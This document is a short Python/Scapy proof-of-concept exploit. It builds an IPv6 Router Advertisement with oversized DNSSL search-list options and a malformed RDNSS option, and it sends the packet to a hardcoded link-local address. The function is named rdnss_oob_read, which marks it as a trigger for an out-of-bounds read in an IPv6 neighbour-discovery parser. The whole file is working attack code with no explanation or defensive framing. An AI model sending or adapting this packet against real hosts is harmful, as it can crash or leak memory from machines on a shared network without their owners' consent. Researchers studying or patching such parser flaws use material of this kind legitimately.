import string
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptDNSSL, ByteField, ShortField, IntField, StrField
from scapy.all import send, Packet

class MyICMPv6NDOptRDNSS(Packet):
    name = "ICMPv6 Neighbor Discovery Option - Recursive DNS Server Option"
    fields_desc = [ByteField("type", 25),
                   ByteField("len", 4),
                   ShortField("res", None),
                   IntField("lifetime", 0xffffffff),
                   StrField("dns", "AAAAAAAAAAAAAAAABBBBBBBB")
    ]

def rdnss_oob_read(target_addr):
    def build_domain_name(name_len):
        CHUNKS = name_len // 0x3f
        subdomains = []
        for i in range(CHUNKS):
            subdomains.append(string.ascii_lowercase[i] * 0x3f)
        domain = '.'.join(subdomains)
        print('final len(domain) :{}'.format(len(domain)))
        return domain

    ip = IPv6(dst = target_addr, hlim = 255)
    ra = ICMPv6ND_RA()
    dnssl1 = ICMPv6NDOptDNSSL(lifetime=1, searchlist=[build_domain_name(1024)])
    dnssl2 = ICMPv6NDOptDNSSL(lifetime=1, searchlist=[build_domain_name(375)])
    dnssl3 = ICMPv6NDOptDNSSL(lifetime=1, searchlist=['1'*22])

    rdnss = MyICMPv6NDOptRDNSS(lifetime=1)

    pkt = ip/ra/dnssl1/dnssl2/dnssl3/rdnss

    print("total pakcet len: %d" % (len(pkt)))
    print("total ipv6 len: %d" % (len(ra/dnssl1/dnssl2/dnssl3/rdnss)))
    send(pkt)

def main():
    target_addr = "fe80::20c:29ff:fed1:1999"
    rdnss_oob_read(target_addr)

if __name__ == '__main__':
    main()
